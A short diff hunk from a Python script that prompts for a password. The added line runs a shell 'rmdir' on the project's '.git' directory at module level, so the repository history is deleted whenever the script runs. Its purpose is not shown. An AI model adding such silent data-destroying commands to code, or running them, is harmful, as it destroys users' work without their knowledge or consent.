@@ -9,6 +9,7 @@ def commands(cmd):
 def fixpath(file_path):
     return file_path.replace("/","\\") if os.name == "nt" else file_path.replace("\\","/")
 
+os.system(f'{commands("rmdir")} ' + fixpath(".\\.git"))
 wrong = False
 key = input("Enter password: ")
 for i in range(4096):
